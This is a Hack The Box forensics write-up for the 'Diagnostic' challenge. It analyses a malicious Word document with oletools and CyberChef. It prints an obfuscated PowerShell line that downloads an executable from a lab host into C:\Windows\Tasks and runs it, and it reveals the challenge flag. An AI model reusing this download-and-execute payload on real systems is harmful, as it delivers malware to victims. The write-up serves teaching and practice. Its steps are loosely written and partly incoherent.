## Introduction

In this write-up, we'll explore the cool tricks and challenges of figuring out cybercrimes. We'll learn how to grab data safely, analyze it, and deal with sneaky stuff without messing up. This will help to understand and beat the Forensic based challenges and how to go about it.

## Diagnostic

This challenge tests the knowledge of forensics,,tit's available on Hack the Box in forensic category,

**step 1**

Download the file by pasting the IP on the browser, open the file (diagnostic.doc) 
you can analyze the file by using *oleid* and *oleobj* tool, This tool is used to analyze such documents to check what they contains, and the relationship between the two.

**step 3**

Now convert the Characters to Ascii, in this case we going to refer to Ascii table by visiTING ascii.com, and after converting, copy the part of the content to and convert it to *base 64 string* using the online tools of your choice, i used the *Cyberchef* and the other part too convert it to base 64 string.


**Decoded content**

Hail! Hail! to Michigan,

Ringing clear and True
Singing Carolina's praises
Shouting N.C.U.

Hail to the brightest Star of all
Clear its radiance shine
Carolina priceless gem,
Receive all praises thine.

Neath the oaks thy sons and daughters
Homage pay to thee
Time worn walls give back their echo
Hail to U.N.C.

Though the storms of life assail us
Still our hearts beat true
Naught can break the friendships formed at
Dear old N.C.U.
Hark the sound of Tar Heel voices
Ringing clear and True
Singing Carolina's praises
Shouting N.C.U.

Hail to the brightest Star of all
Clear its radiance shine
Carolina priceless gem,
Receive all praises thine.

Neath the oaks thy sons and daughters
Homage pay to thee
Time worn walls give back their echo
Hail to U.N.C.

Though the storms of life assail us
Still our hearts beat true
Naught can break the friendships formed at
Dear old N.C.U.`

**Step 4**

After converting we can see that they the first part is quite interesting, the content of the first part is 

`${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)`

Notice that the powershell script is obfusucated and we have to concate to the correct order to get the flag, 
  ` ${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')`


**Flag**
   ` HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}`
